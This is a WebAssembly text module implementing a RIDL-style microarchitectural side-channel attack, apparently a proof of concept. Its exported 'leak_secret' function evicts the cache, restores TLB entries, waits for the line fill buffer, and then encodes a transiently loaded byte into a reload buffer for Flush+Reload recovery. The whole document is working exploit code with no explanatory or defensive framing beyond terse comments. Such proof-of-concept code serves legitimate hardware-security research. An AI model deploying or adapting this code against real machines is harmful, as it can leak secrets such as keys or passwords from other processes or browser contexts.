(module
  (import "env" "memory" (memory $mem 16384 16384))

  (type $t0 (func (param i32) (result i32)))
  (type $t1 (func (param i32) (param i32) (result i32)))

  (func $leak_secret (export "leak_secret") (type $t1) (param $page_off i32) (param $cl_off i32) (result i32)
    (local $paging_off i32)
    (local $buff i32)
    (local $tmp i32)
    (local $buff2 i32)

    ;; first page of the eviction_buff
    (set_local $buff 
        (i32.load 
          (i32.shl
            (i32.const 256)
            (i32.const 12)
          )
        )
      )

    ;; 1KB p-chase for cache eviction   
    (loop $evict
      (set_local $buff 
        (i32.load (get_local $buff))
      )
      (i32.store (i32.add (get_local $buff) (i32.const 8)) (i32.const 0x00))
      (br_if $evict
        (i32.ne 
          (get_local $buff)
          (i32.const 0)
        )
      )
    )
    (set_local $tmp (i32.add (get_local $tmp) (get_local $buff)))
    (set_local $buff (i32.const 0))
    
    ;; touching RELOAD buff pages to bring back the TLB entries
    (loop $tlb_touch
      (i32.store (i32.add (get_local $buff2) (i32.const 256)) (i32.const 0x00))
      (set_local $buff (i32.add (get_local $buff) (i32.const 1024)))
   (br_if $tlb_touch
        (i32.ne 
          (get_local $buff)
          (i32.const 262144)
        )
      )
    )
    (set_local $buff (i32.add (get_local $buff) (get_local $tmp)))
    
    (set_local $buff (i32.const 0))
    (set_local $tmp (i32.const 0xc000))
    
    ;; do some arithmetic to wait for the LFB to get cleaned 
    ;; from the dirty cachelines previously evicted

    (loop $wait
      (set_local $tmp (i32.sub (get_local $tmp) (i32.const 1)))
      (br_if $wait (i32.ne (get_local $tmp) (i32.const 0)))
    )
    (set_local $tmp (i32.add (get_local $tmp) (get_local $buff)))

    ;; ridl time
    (set_local $cl_off (i32.add (get_local $cl_off) (i32.const 0)))
    (set_local $paging_off
        (i32.add 
        (i32.shl (get_local $page_off)(i32.const 12)) 
        (get_local $cl_off)
        )
    )
    (i32.add (get_local $buff) (i32.load
      (i32.shl 
        (i32.and (i32.load (get_local $paging_off)) (i32.const 0xff))
        (i32.const 10)
      )
    ))
  )

  (func $touch_secret (export "touch_secret") (type $t0) (param $secret i32) (result i32)
    (local $tmp i32)
    (i32.load
      (i32.shl 
        (get_local $secret)
        (i32.const 10)
      )
    )
   )

  )
